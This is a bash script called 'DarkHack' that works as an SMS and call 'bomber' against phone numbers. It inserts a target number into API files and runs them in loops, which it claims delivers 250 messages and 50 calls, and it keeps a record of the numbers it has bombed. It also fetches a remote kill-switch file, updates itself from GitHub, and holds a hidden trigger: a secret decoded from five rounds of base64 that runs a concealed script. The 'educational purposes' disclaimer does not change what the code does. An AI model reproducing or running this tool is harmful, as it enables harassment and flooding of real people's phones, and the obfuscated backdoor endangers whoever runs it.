#!/bin/bash



RED="$(printf '\e[31m')"
GREEN="$(printf '\e[32m')"
ORANGE="$(printf '\e[33m')"
BLUE="$(printf '\e[34m')"
MAGENTA="$(printf '\e[35m')"
CYAN="$(printf '\e[36m')"
WHITE="$(printf '\e[37m')"
BLACK="$(printf '\e[30m')"

apt-get install -y git curl wget pv espeak figlet

clear
just() {
clear
echo ""
echo ""
printf  "                      \e[1;33m--->Connecting<---"
echo ""
echo ""
echo ""
}


banner() {

echo -e ""
figlet DarkHack
echo ""
sleep 1
echo "                                    $WHITE Author:$RED King-Nazim And MishalMMSS"
echo ""

}

#    Check Internet
wget -q --spider https://github.com/King-Nazim

if [ $? -eq 0 ]; then
    just
else
    clear
    echo -e "\e[1;34m‎‎‏‏ ‎"
    banner
    sleep 1
    echo ""
    echo ""
    echo -e "\e[92m[\e[91m~\e[92m]\e[93m You are not connected to internet !\e[93m"
    echo ""
    echo -e "\e[92m[\e[91m~\e[92m]\e[93m Please connect and try again !!\e[93m"
    echo ""
    echo ""
    exit
fi

rm .server.txt > /dev/null 2>&1
wget -L https://raw.githubusercontent.com/anubhavanonymous/serverxlr8/main/.server.txt  > /dev/null 2>&1
serverup="On"
server=$(cat .server.txt | grep On)
if [[ $server = $serverup ]]
then
echo ""
else
clear
echo ""
sleep 1
figlet ERROR 404
echo ""
echo ""
sleep 2
echo ""
echo -e "      \e[92m[\e[33m~\e[92m]\e[0m Sorry for the inconvenience :(" | pv -qL 30
echo ""
echo -e "      \e[92m[\e[33m~\e[92m]\e[36m The Server is under maintenance !!" | pv -qL 20
echo ""
echo -e "      \e[92m[\e[33m~\e[92m]\e[0m Contact the developer !" | pv -qL 30
echo ""
exit
exit
exit
fi

updatee() {
clear
echo -e "\e[92m "
clear
echo ""
figlet Updating Script
echo ""
echo ""
echo -e "      \e[92m[\e[93m~\e[92m]\e[36m Requesting Update From Source...\e[93m"
sleep 2
echo ""
echo -e "      \e[92m[\e[93m~\e[92m]\e[0m Request Attempt Successful..\e[93m"
sleep 1
echo ""
echo -e "      \e[92m[\e[93m~\e[92m]\e[36m Updating Now...\e[93m"
sleep 2
echo ""
cd ..
rm -rf darkhack
git clone https://github.com/King-Nazim/darkhack > /dev/null 2>&1
cd darkhack
chmod +x bomb.sh
clear
echo ""
figlet Script Updated
echo ""
sleep 3
echo ""
echo -e "        \e[92m[\e[91m~\e[92m]\e[91m Restarting DarkHack !\e[93m"
sleep 2
bash bomb.sh
}


bombrecord() {
clear
echo ""
figlet Bomb Record
echo ""
echo ""
echo -e "     \e[92m[\e[36m~\e[92m]\e[93m This is a record of numbers which had been bombed !\e[93m" | pv -qL 30
echo " $GREEN"
cat .bombrecord.txt
exit
}

PW_WD=$(pwd)
cd model
cp headapis $PW_WD
cp tailapis $PW_WD
cp anonapi $PW_WD
cd ..

SECRET=VmtjMWQyTnJNSGROVlZab1pXdGFUMVZyV2tkT2JGSjFXa2hhVVZWWE9EbERaejA5Q2c9PQo=
for i in {1..5}
do SECRET=$(echo $SECRET | base64 --decode)
done


about() {
clear
echo -e '''
         \e[1;91m      ╔═══════════╗
         \e[1;91m    ╔═╝\e[1;97m███████████\e[1;91m╚═╗
         \e[1;91m   ╔╝\e[1;97m███████████████\e[1;91m╚╗
         \e[1;91m   ║\e[1;97m█████\e[1;92mDarkHack\e[1;97m█████\e[1;91m║
         \e[1;91m   ║\e[1;97m█████████████████\e[1;91m║\e[1;91m
         \e[1;91m   ║\e[1;97m█████████████████\e[1;91m║\e[1;91m
         \e[1;91m   ║\e[1;97m█\e[1;91m╔\e[1;97m█████████████\e[1;91m╗\e[1;97m█\e[1;91m║\e[1;91m
         \e[1;91m   ╚╦╝\e[1;97m███\e[1;90m▒▒\e[1;97m███\e[1;90m▒▒\e[1;97m███\e[1;91m╚╦╝\e[1;91m
         \e[1;91m   ╔╝\e[1;97m██\e[1;90m▒▒▒▒\e[1;97m███\e[1;90m▒▒▒▒\e[1;97m██\e[1;91m╚╗\e[1;91m
         \e[1;91m   ║\e[1;97m██\e[1;90m▒▒▒▒▒\e[1;97m███\e[1;90m▒▒▒▒▒\e[1;97m██\e[1;91m|\e[1;91m
         \e[1;91m   ║\e[1;97m██\e[1;90m▒▒▒▒\e[1;97m█████\e[1;90m▒▒▒▒\e[1;97m██\e[1;91m║\e[1;94m
         \e[1;91m   ╚╗\e[1;97m███████████████\e[1;91m╔╝\e[1;94m
         \e[1;91m  ╔═╬══╦╝\e[1;97m██\e[1;90m▒\e[1;97m█\e[1;90m▒\e[1;97m██\e[1;91m╚╦══╝\e[1;90m .▒..
         \e[1;91m  ║\e[1;97m█\e[1;91m║══║\e[1;97m█████████\e[1;91m║\e[1;90m ...▒.       \e[1;93m
         \e[1;91m  ║\e[1;97m█\e[1;91m║══║\e[1;97m█\e[1;91m║\e[1;97m██\e[1;91m║\e[1;97m██\e[1;91m║\e[1;97m█\e[1;91m║\e[1;90m　.▒..
         \e[1;91m  ║\e[1;97m█\e[1;91m║══╚═╩══╩╦═╩═╩═╦╗\e[1;90m▒.
         \e[1;91m ╔╝\e[1;97m█\e[1;91m╚══╦═╦══╦╩═╦═╦═╩╝  \e[38;5;48m
         \e[1;91m╔╝\e[1;97m█████\e[1;91m║\e[1;97m█\e[1;91m║\e[1;97m██\e[1;91m║\e[1;97m██\e[1;91m║\e[1;97m█\e[1;91m║
         \e[1;91m║\e[1;97m██████\e[1;91m║\e[1;97m█████████\e[1;91m║
''' | pv -qL 300
sleep 1.2
echo -e "                                  This is\e[1;0m King-Nazim And MishalMMSS" | pv -qL 150
echo "                                     From Dark Hackers !" | pv -qL 150
echo ""
echo -e "     $GREEN  Ethical Hackers$WHITE |$GREEN CyberSec Students$WHITE |$GREEN Programmers" | pv -qL 10
echo ""
printf "\e[0m\e[92m                 Group Admin at$WHITE Dark Hackers\e[0m\n" | pv -qL 12
echo ""
echo "       $MAGENTA          Our social handles are below !!" | pv -qL 10
echo ""
printf "\e[0m\e[92m          Github \e[0m\e[91m     :    \e[0m\e[96mgithub.com/King-Nazim\e[0m\n" | pv -qL 50
printf "\e[0m\e[92m          Github \e[0m\e[91m     :    \e[0m\e[96mgithub.com/Mishalmmss\e[0m\n" | pv -qL 50
echo ""
printf "\e[0m\e[92m         Instagram \e[0m\e[91m   :   \e[0m\e[96minstagram.com/nazimcp7\e[0m\n" | pv -qL 50
printf "\e[0m\e[92m         Instagram \e[0m\e[91m   :   \e[0m\e[96minstagram.com/_mishal_hussain_\e[0m\n" | pv -qL 50
echo ""
echo -e "\e[1;91m                        Happy Hacking :)" | pv -qL 10
sleep 7
menux
}

eexec() {
echo "Under construction"
exit
}

menu() {
clear
echo ""
figlet Bombing
echo ""
echo ""
printf "             \e[1;92m[\e[0m Dark_Hacks\e[1;92m ]\e[0m \e[1;93mEnter target  >>> \e[0m"
read targett
if [[ $targett = $SECRET ]]
then
bash .notyourbusiness.sh
else
printf "\n"
echo ""
Date=$(date)
echo -e "      $targett was bombed on $Date"  >> .bombrecord.txt
printf "  Bombing\n"
echo ""
printf "             ~~~\e[1;92m Attack Started On +91$targett \e[0m~~~"
sleep 1
echo ""
echo ""
printf "\n"
printf "   Press ctrl+c to quit ! \n"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m Else it will automatically stop after 5 min\e[93m"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m After sending 250 msgs and 50 calls !!\e[93m"
echo ""

while read a; do
    echo ${a//€shushhi/$targett}
done < headapis > headapis.t
mv headapis{.t,}

while read a; do
    echo ${a//€shushhi/$targett}
done < tailapis > tailapis.t
mv tailapis{.t,}

for i in {1..4}
do bash headapis
done

for i in {1..27}
do bash tailapis
done

exit 
fi
}





menux() {
clear
clear
banner
sleep 1
DATE=$(date)
echo "$WHITE✯ Started on $RED$DATE"
echo "$WHITE------------------------------"
printf "\e[1;33m⚡ This tool is only for Educational Purposes !!\e[0m\n"
echo "------------------------------"
echo ""
sleep 1
printf "\e[1;92m[\e[0m 1\e[1;92m ]\e[0m>>>\e[1;33m MASS BOMBING \e[0m\n"
printf "\e[1;92m[\e[0m 2\e[1;92m ]\e[0m>>>\e[1;33m UPDATE \e[0m\n"
printf "\e[1;92m[\e[0m 3\e[1;92m ]\e[0m>>>\e[1;33m ABOUT \e[0m\n"
printf "\e[1;92m[\e[0m 4\e[1;92m ]\e[0m>>>\e[1;33m QUIT \e[0m\n"
echo ""
printf "\e[1;31m Select Option !! \e[0m−−⋙⋙⋙ "
read options
if [ "$options" -eq "0" ];then
        bombrecord
fi
if [ "$options" -eq "1" ];then
        menu
fi
if [ "$options" -eq "2" ];then
        updatee
fi
if [ "$options" -eq "3" ];then
        about
fi
if [ "$options" -eq "007" ];then
        eexec
fi
if [ "$options" -eq "4" ];then
        echo ""
        echo -e "\e[92m[\e[91m~\e[92m]\e[93m Thanks for Using Dark_Hacks !\e[93m"
        echo ""
        exit
else
        menux
fi


}
menux
